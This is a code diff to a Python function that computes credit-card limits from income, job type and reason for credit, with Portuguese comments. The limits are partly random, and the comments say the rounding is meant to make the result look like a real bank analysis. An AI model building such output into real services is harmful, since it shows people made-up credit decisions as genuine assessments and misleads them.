@@ -514,8 +514,8 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     except:
         r_val = 1500.0
 
-    # Base de cálculo mais realista e agressiva para limite alto (150% a 350% da renda)
-    base_limite = r_val * random.uniform(1.5, 3.5)
+    # Base de cálculo proporcional à renda informada (1.0x a 2.5x)
+    base_limite = r_val * random.uniform(1.0, 2.5)
     
     tipo = tipo_renda.lower()
     motivo_lower = motivo.lower()
@@ -525,33 +525,36 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     if any(x in tipo for x in ["servidor", "público", "aposentado"]):
         estabilidade = 1.5  # Alta estabilidade = Risco Menor
     elif any(x in tipo for x in ["clt", "carteira assinada"]):
-        estabilidade = 1.3  # Estabilidade média
+        estabilidade = 1.2  # Estabilidade média
     elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
-        estabilidade = 1.1  # Boa renda, mas variável
+        estabilidade = 1.0  # Boa renda, mas variável
     elif any(x in tipo for x in ["autônomo", "freelancer", "informal"]):
-        estabilidade = 0.8  # Risco maior
+        estabilidade = 0.7  # Risco maior
     elif any(x in tipo for x in ["estudante", "desempregado"]):
-        estabilidade = 0.4  # Risco muito alto
+        estabilidade = 0.3  # Risco muito alto
+        base_limite = min(base_limite, 500) # trava estrita para desempregados
 
     # 3. Análise de Risco pelo Motivo do Crédito
     fator_risco = 1.0
     if "viagem" in motivo_lower:
-        fator_risco = 1.15  # Perfil consumista com ticket alto
+        fator_risco = 1.1  
     elif "específica" in motivo_lower:
-        fator_risco = 1.05  # Perfil focado
+        fator_risco = 1.0  
     elif "organizar" in motivo_lower or "dívida" in motivo_lower:
-        fator_risco = 0.8   # Sinal vermelho (provável endividamento)
+        fator_risco = 0.6   # Sinal vermelho forte (corta quase pela metade)
     
     # Cálculo final do Limite
     limite = base_limite * estabilidade * fator_risco
     
-    # Limites Hardcodes de Segurança (Nenhum cartão começa com limite exorbitante do nada)
+    # Limites Hardcodes de Segurança lógicos
     if limite < 300: 
-        limite = random.choice([300, 400, 500])  # Limite mínimo de entrada
-    if limite > r_val * 1.2: 
-        limite = r_val * 1.2  # Teto de segurança (1.2x a renda)
+        limite = random.choice([300, 400])  # Limite mínimo
+    
+    # Teto máximo saudável para não assustar (máx 3x a renda ou 8000 absoluto)
+    if limite > r_val * 3.0: 
+        limite = r_val * 3.0
     if limite > 8000: 
-        limite = random.uniform(5000, 8000) # Teto absoluto para aprovação automática
+        limite = random.uniform(6000, 8000)
         
     # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
     limite = round(limite / 50) * 50
